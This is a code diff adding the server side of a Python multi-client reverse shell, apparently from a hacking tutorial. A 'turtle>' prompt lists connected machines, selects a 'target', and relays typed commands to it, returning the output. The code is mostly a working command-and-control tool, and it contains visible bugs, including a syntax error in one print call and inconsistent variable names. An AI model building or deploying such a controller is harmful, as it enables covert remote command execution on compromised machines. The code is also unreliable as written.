@@ -52,6 +52,90 @@ def accept_connections():
         except:
             print("Error accepting connections")
 
+# Interactive prompt for sending commands remotely
+def start_turtle():
+    cmd = input('turtle> ')
+    if cmd == 'list':
+        list_connections()
+    elif 'select' in cmd:
+        conn = get_target(cmd)
+        if conn is not None:
+            send_target_commands(conn)
+    else:
+        print("Command not recognized")
+
+
+
+#Displays all current connections
+def list_connections():
+    results = ''
+    for i,conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+        results += str(i) + '   ' + str(all_address[i][0]) + '   ' + str(all_addresses[i][1])
+    print('-----Clients-----' + '\n' + results)
+
+#Select a target client
+def get_target(cmd):
+    try:
+        target = int(cmd.replace('select ', ''))
+        conn = all_connections[target]
+        print("You are now connected to " str(all_address[target][0]))
+        print(str(all_addresses[target][0]) + '> ', end="")
+        return conn
+    except:
+        print("Not a valid selection")
+        return None
+#Connect with remote target client
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end="")
+            if cmd == 'quit':
+                break
+        except:
+            print("Connection was lost")
+            break
+
+#Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+#Do the next job in the queue
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            socket_create()
+            socket_bind()
+            accept_connections()
+        elif x == 2:
+            start_turtle()
+        queue.task_done()
+
+
+#Each list item is a new job
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+        
+def main():
+    create_workers()
+    create_jobs()
+
 
 if __name__ == "__main__":
     main()
